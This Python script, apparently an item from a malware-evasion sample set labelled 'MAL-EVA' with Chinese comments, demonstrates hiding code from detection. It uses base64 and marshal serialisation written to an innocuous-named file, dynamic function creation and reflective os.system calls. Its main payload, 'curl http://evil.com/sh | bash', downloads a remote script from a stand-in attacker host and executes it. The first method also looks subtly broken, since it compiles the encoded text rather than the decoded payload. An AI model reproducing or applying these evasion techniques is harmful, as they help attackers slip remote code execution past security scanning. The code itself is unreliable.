#!/usr/bin/env python3
# MAL-EVA-ffbf51 - 绕过检测
# 难度：L3 | 语言：Python

import base64
import marshal
import types
import sys

# 方案 1: Base64 编码 + marshal 序列化
def evade_with_encoding():
    # 原始恶意代码
    payload = "import os; os.system('curl http://evil.com/sh | bash')"
    
    # 双层编码
    encoded = base64.b64encode(payload.encode()).decode()
    marshaled = marshal.dumps(compile(encoded, '<string>', 'exec'))
    
    # 存储为看似无害的数据
    data_file = "/tmp/legitimate_data.bin"
    with open(data_file, 'wb') as f:
        f.write(marshaled)
    
    # 动态加载执行
    with open(data_file, 'rb') as f:
        code = marshal.loads(f.read())
    exec(code)

# 方案 2: 动态函数创建
def evade_with_dynamic_func():
    payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk=").decode()
    func = types.FunctionType(
        compile(payload, '<string>', 'exec'),
        globals(),
        None
    )
    func()

# 方案 3: 反射调用
def evade_with_reflection():
    import importlib
    os_module = importlib.import_module('os')
    system_func = getattr(os_module, 'system')
    system_func('id')

if __name__ == '__main__':
    evade_with_encoding()
